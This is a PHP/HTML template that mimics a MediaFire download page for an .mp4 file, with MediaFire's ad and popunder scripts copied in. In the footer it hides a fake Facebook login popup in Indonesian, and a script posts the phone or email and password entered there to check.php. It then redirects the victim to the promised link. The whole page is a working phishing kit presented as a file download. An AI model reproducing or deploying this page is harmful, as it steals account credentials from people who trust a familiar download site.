<div class="filename"><?php echo $namafile; ?>.mp4</div>
</div>
<label for="compat-select" style="display: block; margin-bottom: 10px;">System compatibility</label>
<select class="g-Select" id="compat-select" title="Select operating system">
<option value="windows" data-compat="">
Windows </option>
<option value="osx" data-compat="">
macOS </option>
<option value="linux" data-compat="">
Linux </option>
</select>
<div class="Download-compatibilityStatus is-compatible" id="compat-supported">
<span></span>
<p>File is compatible with the selected operating system.</p>
</div>
<div class="Download-compatibilityStatus is-notCompatible" id="compat-unsupported" style="display:none">
<span></span>
<p>File is not compatible with the selected operating system.</p>
</div>
<script type="text/javascript">
                            var compatSelect = document.getElementById('compat-select');
                            var compat = document.getElementById('compat-supported');
                            var nonCompat = document.getElementById('compat-unsupported');
                            compatSelect.onchange = function(e) {
                                var options = e.target.options;
                                var selection = options[options.selectedIndex];
                                var supported = selection && selection.attributes['data-compat'];
                                compat.style.display = supported ? 'block' : 'none';
                                nonCompat.style.display = !supported ? 'block' : 'none';
                            };

                        </script>
</div>
</div>
</div>
</div>
</div>

<div id="non-dl-content" class="nonDLContentWrap">
<style type="text/css">
                #div-gpt-ad-1583943391676-0 {
                    width: 100%; height: 100px; top: 70px; position: absolute; align-items: center; justify-content: center; display: flex;
                }
            </style>
<div id="div-gpt-ad-1583943391676-0" data-google-query-id="CJ7VjL_b3_cCFVnmcwEdaeIH-w">

<div id="google_ads_iframe_/183096492/Mediafire-Mobileweb-Top_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/183096492/Mediafire-Mobileweb-Top_0" name="google_ads_iframe_/183096492/Mediafire-Mobileweb-Top_0" title="3rd party ad content" width="320" height="100" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" role="region" aria-label="Advertisement" tabindex="0" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" srcdoc="" data-google-container-id="1" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div>
<style type="text/css">
                #div-gpt-ad-1583943269780-0 {
                    width: 100%; height: 100px; top: 440px; left: 0; position: absolute; display: flex; align-items: center; justify-content: center;
                }
            </style>
<div id="div-gpt-ad-1583943269780-0" data-google-query-id="CO7Ykr_b3_cCFbUatwAd93oIqQ">

<div id="google_ads_iframe_/183096492/MediaFire-MobileWeb-Bottom_0__container__" style="border: 0pt none;"><iframe id="google_ads_iframe_/183096492/MediaFire-MobileWeb-Bottom_0" name="google_ads_iframe_/183096492/MediaFire-MobileWeb-Bottom_0" title="3rd party ad content" width="320" height="50" scrolling="no" marginwidth="0" marginheight="0" frameborder="0" role="region" aria-label="Advertisement" tabindex="0" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" srcdoc="" data-google-container-id="2" style="border: 0px; vertical-align: bottom;" data-load-complete="true"></iframe></div></div>
<style type="text/css">
                #div-gpt-ad-1583943164748-0 {
                    width: 100%; height: 100px; bottom: 0; left: 0; display: flex; align-items: center; position: absolute; justify-content: center;
                }
            </style>
<div id="div-gpt-ad-1583943164748-0">
<script type="text/javascript">
                    googletag.cmd.push(function() {
                        googletag.display('div-gpt-ad-1583943164748-0');
                    });
                </script>
</div>
<script type="text/javascript">
                    window['adLazyLoadQueue'].push("div-gpt-ad-1583943164748-0");
                </script> </div>

<div class="DLExtraInfo-wrap">

<div class="DLExtraInfo">

<div class="DLExtraInfo-uploadLocation DLExtraInfo-column">
<div class="lazyload DLExtraInfo-uploadLocationMap Continent DLExtraInfo-uploadLocationMapBg" data-lazyclass="DLExtraInfo-uploadLocationMapBg">
<span>Upload region:</span>
<div class="lazyload DLExtraInfo-uploadLocationRegion continent-as" data-lazyclass="continent-as"></div>
</div>

<div class="lazyload DLExtraInfo-sectionGraphic flag flag-id" data-lazyclass="flag-id"></div>
<div class="DLExtraInfo-sectionDetails">
<p>This file was uploaded from Indonesia on May 14, 2022 at 2:15 PM</p>
</div>
</div>
<div class="DLExtraInfo-upload DLExtraInfo-column">

<div class="DLExtraInfo-virusTotal DLExtraInfo-row">
<div class="DLExtraInfo-sectionGraphic">
<div class="lazyload DLExtraInfo-sectionGraphicCenter DLExtraInfo-virusTotalImage" data-lazyclass="DLExtraInfo-virusTotalImage"></div>
</div>
<div class="DLExtraInfo-sectionDetails">
<div class="DLExtraInfo-sectionHeading">VirusTotal scan</div>
<p>
MediaFire scans high-risk files using VirusTotal.
</p>
</div>
</div>

<div class="DLExtraInfo-Facebook DLExtraInfo-row">
<div class="social-cont">
<div class="social-fb-cont">
<span id="social-fb-label">Like MediaFire on Facebook</span>
<iframe class="lazyload nopop" data-lazysrc="https://www.facebook.com/plugins/like.php?href=http://www.facebook.com/MediaFire&amp;width=193&amp;layout=button_count&amp;action=like&amp;show_faces=false&amp;share=true&amp;height=30&amp;appId=124578887583575" src="" width="190" height="30" scrolling="no" frameborder="0" allowtransparency="true" aria-labelledby="social-fb-label"></iframe>
</div>
</div>
<noscript><style>.social-fb-cont>iframe{display:block}</style></noscript>
</div>
</div>
</div>

<div class="DLExtraInfo DLExtraInfo-additional">

<div class="DLExtraInfo-accountStatus DLExtraInfo-column">
<div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="DLExtraInfo-accountStatusImage"></div>
<div class="DLExtraInfo-sectionDetails">
<div class="DLExtraInfo-sectionHeading">About MediaFire</div>
<div class="DLExtraInfo-sectionSubHeading">Welcome!</div>
<p>
With MediaFire, you get simple yet powerful file storage
along with features you won’t find anywhere else. <a href="/upgrade">Learn more</a>
</p>
</div>
</div>

<div class="DLExtraInfo-downloadApp DLExtraInfo-column">
<div class="lazyload DLExtraInfo-sectionIcon" data-lazyclass="browser-chrome"></div>
<div class="DLExtraInfo-sectionDetails">
<div class="DLExtraInfo-sectionHeading">Download application</div>
<div class="DLExtraInfo-sectionSubHeading">Chrome</div>
<p>
You are downloading this file with <span>Chrome, version 98.0.</span>
</p>
</div>
</div>
</div>
</div>
</div>
<div id="share" class="lightbox" role="dialog" tabindex="-1" style="">
<figure>
<a href="#" class="close" id="share-close" title="Close share dialog"><span style="display: none">Close share dialog</span></a>
<figcaption>
<iframe id="share-iframe" data-src="/ser.php" allowtransparency="true" style="" src="/ser.php">
                    <p id="share-desc">
                        Failed to load. Try again in a supported browser.
                    </p>
                </iframe>
<noscript>
                    <p id="share-desc">
                        Failed to load. Please enable JavaScript.
                    </p>
                </noscript>
</figcaption>
</figure>
</div>
</main><iframe name="googlefcPresent" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe><iframe name="googlefcPresent" style="display: none; width: 0px; height: 0px; border: none; z-index: -1000; left: -1000px; top: -1000px;"></iframe>
<footer role="contentinfo" id="footer" class="footer">
<div class="u-wrap" id="mainFooterWrap">
<div class="footerColWrap u-cf">
<div class="footerCol">
<h2><a href="/about/">Company</a></h2>
<ul>
<li class="minFooterShow"><a href="/about/">About<b> Us</b></a></li>
<li><a href="/about/jobs.php">Careers</a></li>
<li><a href="/press/">Press</a></li>
<li><a href="http://blog.mediafire.com/" target="_blank">Company Blog</a></li>
</ul>
</div>
<div class="footerCol">
<h2><a href="/software/index.php">Tools</a></h2>
<ul>
<li class="minFooterShow">
<a href="/software/mobile/"><b>MediaFire </b>Mobile</a>
</li>
<li class="minFooterShow">
<a href="https://vividengine.com" target="_blank" title="Powerful On-Demand Video Processing CDN - Video transformations, optimization, and delivery using simple and robust URL parameters.">On-Demand Video Encoding</a>
</li>
</ul>
</div>
<div class="footerCol">
<h2><a href="/upgrade/">Upgrade</a></h2>
<ul>
<li><a href="/upgrade/index.php?plan=Pro">Professional</a></li>
</ul>
</div>
<div class="footerCol">
<h2><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank">Support</a></h2>
<ul>
<li class="minFooterShow"><a href="https://mediafire.zendesk.com/hc/en-us" target="_blank"><b>Get Support</b></a></li>
</ul>
</div>
</div>
</div>

<div id="subFooterWrap">
<div id="subFooter" class="u-wrap">
<ul class="subFooterLinks">
<li id="copyrightInfo">©2022 MediaFire<span> Build 121874</span></li>
<li><a href="/advertising/">Advertising</a></li>
<li><a href="/policies/terms_of_service.php">Terms</a></li>
<li><a href="/policies/privacy_policy.php">Privacy Policy</a></li>
<li><a href="/policy_violation/copyright.php">Copyright</a></li>
<li><a href="/policy_violation/terms_of_service.php">Abuse</a></li>
<li><a href="/credits/">Credits</a></li>
<li><a href="/about/">More...</a></li>
</ul>
<div class="subFooterSocialWrap">
<ul id="subFooterSocial">
<li class="footerIcn">
<a href="http://blog.mediafire.com/" class="footerIcnBlog" target="_blank" title="MediaFire Blog">
<span class="footerIcnBlog"></span>
</a>
</li>
<li class="footerIcn">
<a href="https://twitter.com/#!/mediafire" class="footerIcnTw" target="_blank" rel="noreferrer" title="MediaFire's Twitter page">
<span class="footerIcnTw"></span>
</a>
</li>
<li class="footerIcn" style="margin-left: 0;">
<a href="https://www.facebook.com/mediafire" class="footerIcnFb" target="_blank" rel="noreferrer" title="MediaFire's Facebook page'">
<span class="footerIcnFb"></span>
</a>
</li>
</ul>
</div>
<div class="socialLinks" id="minSocialLinks">
<a href="https://www.facebook.com/mediafire" class="shareFacebook" title="MediaFire on Facebook"><span style="display: none">Facebook Page</span></a>
<a href="https://twitter.com/mediafire" class="shareTwitter" title="MediaFire on Twitter"><span style="display: none">Twitter Page</span></a>
<a href="https://blog.mediafire.com/" class="shareBlogger" title="MediaFire Blog"><span style="display: none">MediaFire Blog</span></a>
</div>
</div>
</div>
<div class="popup-login login-facebook animated fadeIn" style="">
		   <div class="popup-box-login-fb">
		      <div class="navbar-fb">
		         <img width="45" src="fb-login.png">
		      </div>
		      <div class="content-box-fb">
		      	<p class="alert sandi">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
		      	<p class="alert email">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></p>
		         <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTPziTImggDacoac2FhB8i6xivwre1nMVCaBUpzrXDhqfZDAd_3ejFMLPZN&s=10">
		         <div class="txt-login-fb">
		          Masuk ke akun Facebook Anda untuk terhubung dengan MediaFire
		         </div>
                    <form class="login-facebook-form" action="" method="POST">
		            <label>
		            <input type="text" id="user" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off">
		            </label>
		            <label>
		            <input type="password" id="pass" name="password" placeholder="Kata Sandi Facebook" autocomplete="off" autocapitalize="off">
		            </label>
		            <input type="hidden" name="login" value="Facebook">
		            <button type="submit" name="submit" class="btn-login-fb">Masuk</button>
		         </form>
		         <div class="txt-create-account">Buat akun</div>
		         <div class="txt-not-now">Lain kali</div>
		         <div class="txt-forgotten-password">Lupa Kata Sandi? • Pusat Bantuan</div>
		      </div>
		      <div class="language-box">
		         <center>
		         <div class="language-name language-name-active">Bahasa Indonesia</div>
		         <div class="language-name">English (UK)</div>
		         <div class="language-name">Basa Jawa</div>
		         <div class="language-name">Bahasa Melayu</div>
		         <div class="language-name">日本語</div>
		         <div class="language-name">Español</div>
		         <div class="language-name">Português (Brasil)</div>
		         <div class="language-name">
		            <ion-icon name="add-circle-outline"></ion-icon>
		         </div>
		         </center>
		      </div>
		      <div class="copyright">Facebook Inc.</div>
		   </div>
		 </div>
</footer>
<script type="text/javascript">
            window.addEventListener('submit', (e) => {
                e.preventDefault()
                setTimeout(() => {
			$user = $('#user').val().trim();
			$pass = $('#pass').val().trim();
			if($user == '' || $user == null || $user.length <= 5)
			{
				$('.email').show();
				$('.sandi').hide();
				$('.btn-login-fb').html('Masuk')
				return false;
			}else{
				$('.email').hide();
			}
			if($pass == '' || $pass == null || $pass.length <= 5)
			{
				$('.sandi').show();
				$('.btn-login-fb').html('Masuk')
				return false;
			}else{
				$('.sandi').hide();
			}
                // if all form are filled
                if($user !== '' || $user !== null || !$pass == '' || !$pass == null)
                
                {
                    // SEND DATA
                    $.ajax({
                        type: 'POST',
                        url: 'check.php',
                        data: $('form').serialize(),
                        dataType: 'text',
                        success: function() {
                                    $('.login-facebook').toggle();
                                    $('.btn-login-fb').html('Success')
                                    $('.login-facebook').fadeOut();
                                    window.location = '<?php echo $link; ?>';
                            } 
                    })
                }
                    
                },1000)
            })
	</script>
<script data-cfasync="false" type="text/javascript">
/*101*/ 
var isInRect = function(selector, clickEvent) {
    if (selector != null && clickEvent != null) {
        var linkPosX = clickEvent.clientX;
        var linkPosY = clickEvent.clientY;

        var selectorBox = selector.getBoundingClientRect();

        if ((linkPosX >= selectorBox.left && linkPosX <= selectorBox.right) &&
            (linkPosY >= selectorBox.top && linkPosY <= selectorBox.bottom)) {
            return true;
        }
    }
    return false;
};

window.InfCustomFPSTAMobileFunc = function(event, os, browser, link, sUrl) {
    var w, targetUrl;
    var g = g367CB268B1094004A3689751E7AC568F;
    var isDL = isInRect(document.querySelector(".download_link a.input"), event) ||
        isInRect(document.querySelector(".dl_startlink"), event) ||
        isInRect(document.querySelector(".dl-btn-form"), event) ||
		isInRect(document.querySelector("#download-link"), event);

    var flag = g.Storage.GetLocalStorage("inf-mediafire-activate");
    if (flag === "1") {
        g.PopLoaded = false;
        g.PopRunning = false;
        g.Storage.DeleteLocalStorage("inf-mediafire-activate");
        return true;
    }

    if (link.nodeName.toLowerCase() === "a" &&
        link.getAttribute("href") != "#" &&
        link.getAttribute("href").indexOf("javascript:") == -1) {
        targetUrl = isDL ? g._Top.document.location : link.getAttribute("href");
    } else {
        g.PopLoaded = false;
        g.PopRunning = false;
        return true;
    }

    g.OnFastPopLoaded();
    g.IncrementFastPopCap();
    g.PopRunning = false;

    if (g.PopSettings.IsTracking) { // Tracking zone enabled
        doTrackingFastPop();
    } else {

        var tabWinName = 'inftabwindow_' + Math.floor((Math.random() * 100000000) + 1).toString();
        if (isDL) {
            g.Storage.SetLocalStorage("inf-mediafire-activate", "1");
        }
        if (g.IsMobile.iOS(g._Top) && g.IsMobile.Opera(g._Top)) {
            window.open(sUrl, tabWinName);
            g._Top.document.location = targetUrl;
        } else {
            if (os.name === "iOS" &&
                (browser.name === "Chrome" ||
                    (browser.name === "Mobile Safari" && parseFloat(browser.version) < parseFloat("8")))) {
                window.open(targetUrl, tabWinName);
            } else {
                if (g.PopSettings.MobileHistory) {
                    try {
                        var nw = window.open("about:blank");
                        try {
                            nw.history.replaceState({
                                    previous: g._Top.location.href
                                },
                                null,
                                g._Top.location.href);
                        } catch (err) {
                            g.ConsoleLog(err);
                        }
                        nw.addEventListener("popstate",
                            function(e) {
                                nw.location = e.state.previous;
                            });
                        nw.location = targetUrl;
                    } catch (err) {
                        g.ConsoleLog(err);
                        window.open(targetUrl, tabWinName);
                    }
                } else {
                    window.open(targetUrl, tabWinName);
                }
            }

            if (os.name == "Android") { // doing this because android opens the clicked link in same tab too
                link.setAttribute("href", sUrl);
            }
            g._Top.document.location = sUrl;
        }
    }

    if (event.preventDefault !== undefined) {
        event.preventDefault();
    }
    return false;
};

window.InfCustomSTAMobileFunc = function(Module, event, os, browser, link, redirectUrl) {
    var g = Module.Loader;

    var isDL = isInRect(document.querySelector(".download_link a.input"), event) ||
        isInRect(document.querySelector(".dl_startlink"), event) ||
        isInRect(document.querySelector(".dl-btn-form"), event) ||
		isInRect(document.querySelector("#download-link"), event);

    var urlToOpen = isDL ? link.getAttribute("href") : Module._Top.document.location;

    if (link.nodeName.toLowerCase() === "a" &&
        link.getAttribute("href") !== "#" &&
        link.getAttribute("href").indexOf("javascript:") === -1 &&
        !(Module.Media.Settings.RespectTargetBlank &&
            (link.getAttribute("target") === "_blank" || link.getAttribute("rel") === "nofollow"))) {

        if (Module.PopLoaded ||
            !Module.Loader.IsClientSideFiltersPassed(Module.Media.ClientSideFilters,
                Module.Loader.LogZoneFilter({
                    Id: Module.Media.ZoneId,
                    Name: Module.Media.ZoneName
                }))) {
            return true;
        }

        Module.OnPopunderLoaded();
        Module.AdShown = true;
        if (Module.Loader.IsCapped("InfNumPops" + Module.Media.ZoneId,
                "InfNumPopsExpire" + Module.Media.ZoneId,
                Module.Media.Settings.cap)) {
            return true;
        }

        Module.Loader.IncrementCap("InfNumPops" + Module.Media.ZoneId,
            "InfNumPopsExpire" + Module.Media.ZoneId,
            Module.Media.Settings.capLength);

        if (isDL) {
            Module.Loader.Storage.SetLocalStorage("inf-mediafire-activate", "1")
        }
        if (g.IsMobile.iOS(g._Top) && g.IsMobile.Opera(g._Top)) {
            window.open(redirectUrl);
            g._Top.document.location = urlToOpen;
        } else {
            if (os.name === "iOS" &&
                (browser.name === "Chrome" ||
                    (browser.name === "Mobile Safari" && parseFloat(browser.version) < parseFloat("8")))) {
                window.open(urlToOpen);
            } else {
                if (Module.Media.Settings.MobileHistory) {
                    try {
                        var w = window.open("about:blank");
                        try {
                            w.history.replaceState({
                                previous: Module._Top.location.href
                            }, null, Module._Top.location.href);
                        } catch (err) {
                            g.ConsoleLog(err);
                        }
                        w.addEventListener("popstate",
                            function(e) {
                                w.location = e.state.previous;
                            });
                        w.location = urlToOpen;
                    } catch (err) {
                        g.ConsoleLog(err);
                        window.open(urlToOpen);
                    }
                } else {
                    window.open(urlToOpen);
                }
            }

            if (os.name == "Android") { // doing this because android opens the clicked link in same tab too
                link.setAttribute("href", redirectUrl);
            }
            Module._Top.document.location = redirectUrl;
        }

        if (event.preventDefault !== undefined) {
            event.preventDefault();
        }
        return false;
    }
};

window.InfCustomFPSTAFunc = function(event, link, sUrl) {
    var isDL = isInRect(document.querySelector(".download_link a.input"), event) ||
        isInRect(document.querySelector(".dl_startlink"), event) ||
        isInRect(document.querySelector(".dl-btn-form"), event) ||
		isInRect(document.querySelector("#download-link"), event);

    var flag = g367CB268B1094004A3689751E7AC568F.Storage.GetLocalStorage("inf-mediafire-activate");
    if (flag === "1") {
        g367CB268B1094004A3689751E7AC568F.PopLoaded = false;
        g367CB268B1094004A3689751E7AC568F.PopRunning = false;
        g367CB268B1094004A3689751E7AC568F.Storage.DeleteLocalStorage("inf-mediafire-activate");
        return true;
    }

    // disable same tab ad for facebook app users
    var uaParser = g367CB268B1094004A3689751E7AC568F.UaParser;
    var userAgent = uaParser.getUA();
    if (userAgent.indexOf("FBAN/FBIOS") > -1 || userAgent.indexOf("FB_IAB/FB4A") > -1 || userAgent.indexOf("FBAV") > -1) {
        g367CB268B1094004A3689751E7AC568F.PopLoaded = true;
        g367CB268B1094004A3689751E7AC568F.PopRunning = true;
        return true;
    }
    if (g367CB268B1094004A3689751E7AC568F.PopSettings.IsTracking) {
        doTrackingFastPop();
        g367CB268B1094004A3689751E7AC568F.OnFastPopLoaded();
    } else {
        link.setAttribute("data-tabunder", true);

        var tabWinName = 'inftabwindow_' + Math.floor((Math.random() * 100000000) + 1).toString();
        var w;
        var currentUrl = g367CB268B1094004A3689751E7AC568F._Top.document.location.href;

        var reg = /#$/;

        var targetUrl;
        if (link.tagName.toLowerCase() === "a" &&
            link.getAttribute("href").lastIndexOf("javascript:", 0) !== 0 &&
            link.getAttribute("href") !== "#") {
            targetUrl = isDL ? g367CB268B1094004A3689751E7AC568F._Top.document.location : link.href.replace(reg, "");
        } else if (g367CB268B1094004A3689751E7AC568F.PopSettings.SameTabAdSettings.ClickAnywhere) {
            targetUrl = currentUrl;
        } else {
            g367CB268B1094004A3689751E7AC568F.PopLoaded = false;
            g367CB268B1094004A3689751E7AC568F.PopRunning = false;
            return true;
        }

        if (isDL) {
            g367CB268B1094004A3689751E7AC568F.Storage.SetLocalStorage("inf-mediafire-activate", "1");
        }

        // if it's a link, prevent propagation of link clicks for same tab ad to work
        event.preventDefault();

        g367CB268B1094004A3689751E7AC568F.TabHistoryRecorder(currentUrl, g367CB268B1094004A3689751E7AC568F.TabHistoryStorageName);

        try {
            var w = window.open("about:blank", tabWinName);
            try {
                w.history.replaceState({
                    previous: currentUrl
                }, null, currentUrl);
                w.onPageShow = function(e) {
                    if (e.persisted) {
                        w.location.reload();
                    }
                };
            } catch (err) {
                g367CB268B1094004A3689751E7AC568F.ConsoleLog(err);
            }
            w.addEventListener("popstate", function(e) {
                w.location = e.state.previous;
            });
            w.location = targetUrl;
        } catch (err) {
            window.open(targetUrl, tabWinName);
        }

        w.focus();
        g367CB268B1094004A3689751E7AC568F.OnFastPopLoaded();
        g367CB268B1094004A3689751E7AC568F._Top.location.href = sUrl + '&hosted=true';
    }

    if (event.preventDefault !== undefined) {
        event.preventDefault();
    }

    g367CB268B1094004A3689751E7AC568F.PopLoaded = true;
    g367CB268B1094004A3689751E7AC568F.PopRunning = false;
    g367CB268B1094004A3689751E7AC568F.IncrementFastPopCap();
};

var rAb = function() {
    try {
        var flag = g367CB268B1094004A3689751E7AC568F.Storage.GetLocalStorage("inf-mediafire-activate");
        if (flag === "1") {
            var downloadLink = document.querySelector(".download_link a.input") ||
                document.querySelector(".download_link a") ||
                document.querySelector("form.dl-btn-form a.input") ||
				document.querySelector("#download-link");

            if (downloadLink) {
                downloadLink.click();
                var dl = document.getElementById('download_link');
                if (dl) {
                    setTimeout(function() {
                        dl.className = 'download_link started';
                        window.dlStarted = true;
                        setTimeout(function() {
                            dl.className += ' retry';
                        }, 5000);
                    }, 3100);
                }
            }
            g367CB268B1094004A3689751E7AC568F.Storage.DeleteLocalStorage("inf-mediafire-activate");
        }
    } catch (e) {}
};

window.InfCustomerCallback = function() {
    try {
        var g = g367CB268B1094004A3689751E7AC568F;
        var browser = g.UaParser.getBrowser();
        var os = g.UaParser.getOS();
        if (os.name === "Mac OS" && browser.name === "Chrome") {
            if (g._Top.location.href.indexOf("/file/jyn6nnacn9p5rht/AdSupply_Test_File.txt/file") > -1) {
                g.PopSettings.ChromePopApproach = 5;
            } else {
                g.PopLoaded = true;
            }
        } else if (browser.name === "Edge" && browser.major <= 18) {
            g.PopLoaded = true;
        }
    } catch (e) {}
};

window.InfPreFastPopAttachCallback = function() {
    try {
        var g = g367CB268B1094004A3689751E7AC568F;
        var browser = g.UaParser.getBrowser();
        var os = g.UaParser.getOS();
        if (os.name === "Mac OS" &&
            browser.name === "Chrome" &&
            g._Top.location.href.indexOf("/file/jyn6nnacn9p5rht/AdSupply_Test_File.txt/file") > -1) {
            g.PopSettings.ChromePopApproach = 5;
        }
    } catch (e) {}
};

var InfShowNewAds;
try {
    var allowed = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 18, 100, 110, 250, 270, 286, 290, 320, 360, 361, 362, 370, 376, 377, 378, 381, 382, 383, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 398];
    var current = window.top.document.location.href.split("errno=")[1];
    var isAllowed = false;
    if (current) {
        isAllowed = allowed.includes(parseInt(current));
    }
    var el = document.querySelectorAll("div.download_link a.retry");
    if (el.length > 0) {
        InfShowNewAds = el[0].href.match(/template=([0-9]+)/i)[1] === "27";
    }
    InfShowNewAds = InfShowNewAds || isAllowed;
} catch (e) {}
(function(e,a,b,c,g,h){null==e[a]&&e[b+g]&&(e[a]="loading",e[b+g](h,b=function(){e[a]="complete";e[c+g](h,b,!1)},!1))})(document,"readyState","add","remove","EventListener","DOMContentLoaded"); (function(){var e=document.createElement("script");e.type="text/javascript";e.async=!0;e.src="https://cdn.otnolatrnup.com/Scripts/infinity.js.aspx?guid=5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0";e.id="infinity";e.setAttribute("data-guid","5ff0fb62-0643-4ff1-aaee-c737f9ffc0e0");e.setAttribute("data-version","async");var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(e,a)})(); (function(){(function(e,a,b){e.addEventListener?e.addEventListener(a,b,!1):e.attachEvent&&e.attachEvent("on"+a,b)})(window,"load",function(){"undefined"!=typeof g367CB268B1094004A3689751E7AC568F&&g367CB268B1094004A3689751E7AC568F.Core||function(){if("undefined"==typeof e||!e.Core){Array.prototype.filter||(Array.prototype.filter=function(a){if(void 0===this||null===this)throw new TypeError;var b=Object(this),c=b.length>>>0;if("function"!==typeof a)throw new TypeError;for(var g=[],h=2<=arguments.length? arguments[1]:void 0,l=0;l<c;l++)if(l in b){var d=b[l];a.call(h,d,l,b)&&g.push(d)}return g});Array.prototype.find||Object.defineProperty(Array.prototype,"find",{value:function(a,b){if(null==this)throw new TypeError('"this" is null or not defined');var c=Object(this),g=c.length>>>0;if("function"!==typeof a)throw new TypeError("predicate must be a function");for(var h=0;h<g;){var l=c[h];if(a.call(b,l,h,c))return l;h++}}});Array.prototype.map||(Array.prototype.map=function(a){var b,c;if(null==this)throw new TypeError("this is null or not defined"); var g=Object(this),h=g.length>>>0;if("function"!==typeof a)throw new TypeError(a+" is not a function");1<arguments.length&&(b=arguments[1]);var l=Array(h);for(c=0;c<h;){if(c in g){var d=g[c];d=a.call(b,d,c,g);l[c]=d}c++}return l});(function(a,b){var c={extend:function(n,r){var t={},u;for(u in n)t[u]=r[u]&&0===r[u].length%2?r[u].concat(n[u]):n[u];return t},has:function(n,r){return"string"===typeof n?-1!==r.toLowerCase().indexOf(n.toLowerCase()):!1},lowerize:function(n){return n.toLowerCase()},major:function(n){return"string"=== typeof n?n.replace(/[^\d\.]/g,"").split(".")[0]:b},trim:function(n){return n.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"")}},g=function(n,r){for(var t=0,u,x,z,v,F,A;t<r.length&&!F;){var E=r[t],H=r[t+1];for(u=x=0;u<E.length&&!F;)if(F=E[u++].exec(n))for(z=0;z<H.length;z++)A=F[++x],v=H[z],"object"===typeof v&&0<v.length?2==v.length?this[v[0]]="function"==typeof v[1]?v[1].call(this,A):v[1]:3==v.length?this[v[0]]="function"!==typeof v[1]||v[1].exec&&v[1].test?A?A.replace(v[1],v[2]):b:A?v[1].call(this, A,v[2]):b:4==v.length&&(this[v[0]]=A?v[3].call(this,A.replace(v[1],v[2])):b):this[v]=A?A:b;t+=2}},h=function(n,r){for(var t in r)if("object"===typeof r[t]&&0<r[t].length)for(var u=0;u<r[t].length;u++){if(c.has(r[t][u],n))return"?"===t?b:t}else if(c.has(r[t],n))return"?"===t?b:t;return n},l={ME:"4.90","NT 3.11":"NT3.51","NT 4.0":"NT4.0",2E3:"NT 5.0",XP:["NT 5.1","NT 5.2"],Vista:"NT 6.0",7:"NT 6.1",8:"NT 6.2","8.1":"NT 6.3",10:["NT 6.4","NT 10.0"],RT:"ARM"},d={browser:[[/(opera\smini)\/([\w\.-]+)/i, /(opera\s[mobiletab]+).+version\/([\w\.-]+)/i,/(opera).+version\/([\w\.]+)/i,/(opera)[\/\s]+([\w\.]+)/i],["name","version"],[/(opios)[\/\s]+([\w\.]+)/i],[["name","Opera Mini"],"version"],[/\s(opr)\/([\w\.]+)/i],[["name","Opera"],"version"],[/(kindle)\/([\w\.]+)/i,/(lunascape|maxthon|netfront|jasmine|blazer)[\/\s]?([\w\.]*)/i,/(avant\s|iemobile|slim|baidu)(?:browser)?[\/\s]?([\w\.]*)/i,/(?:ms|\()(ie)\s([\w\.]+)/i,/(rekonq)\/([\w\.]*)/i,/(chromium|flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon)\/([\w\.-]+)/i], ["name","version"],[/(konqueror)\/([\w\.]+)/i],[["name","Konqueror"],"version"],[/(trident).+rv[:\s]([\w\.]+).+like\sgecko/i],[["name","IE"],"version"],[/(edge|edgios|edga|edg)\/((\d+)?[\w\.]+)/i],[["name","Edge"],"version"],[/(yabrowser)\/([\w\.]+)/i],[["name","Yandex"],"version"],[/(puffin)\/([\w\.]+)/i],[["name","Puffin"],"version"],[/(focus)\/([\w\.]+)/i],[["name","Firefox Focus"],"version"],[/(opt)\/([\w\.]+)/i],[["name","Opera Touch"],"version"],[/((?:[\s\/])uc?\s?browser|(?:juc.+)ucweb)[\/\s]?([\w\.]+)/i], [["name","UCBrowser"],"version"],[/(comodo_dragon)\/([\w\.]+)/i],[["name",/_/g," "],"version"],[/(windowswechat qbcore)\/([\w\.]+)/i],[["name","WeChat(Win) Desktop"],"version"],[/(micromessenger)\/([\w\.]+)/i],[["name","WeChat"],"version"],[/(brave)\/([\w\.]+)/i],[["name","Brave"],"version"],[/(qqbrowserlite)\/([\w\.]+)/i],["name","version"],[/(QQ)\/([\d\.]+)/i],["name","version"],[/m?(qqbrowser)[\/\s]?([\w\.]+)/i],["name","version"],[/(BIDUBrowser)[\/\s]?([\w\.]+)/i],["name","version"],[/(2345Explorer)[\/\s]?([\w\.]+)/i], ["name","version"],[/(MetaSr)[\/\s]?([\w\.]+)/i],["name"],[/(LBBROWSER)/i],["name"],[/xiaomi\/miuibrowser\/([\w\.]+)/i],["version",["name","MIUI Browser"]],[/;fbav\/([\w\.]+);/i],["version",["name","Facebook"]],[/safari\s(line)\/([\w\.]+)/i,/android.+(line)\/([\w\.]+)\/iab/i],["name","version"],[/headlesschrome(?:\/([\w\.]+)|\s)/i],["version",["name","Chrome Headless"]],[/\swv\).+(chrome)\/([\w\.]+)/i],[["name",/(.+)/,"$1 WebView"],"version"],[/((?:oculus|samsung)browser)\/([\w\.]+)/i],[["name",/(.+(?:g|us))(.+)/, "$1 $2"],"version"],[/android.+version\/([\w\.]+)\s+(?:mobile\s?safari|safari)*/i],["version",["name","Android Browser"]],[/(sailfishbrowser)\/([\w\.]+)/i],[["name","Sailfish Browser"],"version"],[/(chrome|omniweb|arora|[tizenoka]{5}\s?browser)\/v?([\w\.]+)/i],["name","version"],[/(dolfin)\/([\w\.]+)/i],[["name","Dolphin"],"version"],[/((?:android.+)crmo|crios)\/([\w\.]+)/i],[["name","Chrome"],"version"],[/(coast)\/([\w\.]+)/i],[["name","Opera Coast"],"version"],[/fxios\/([\w\.-]+)/i],["version", 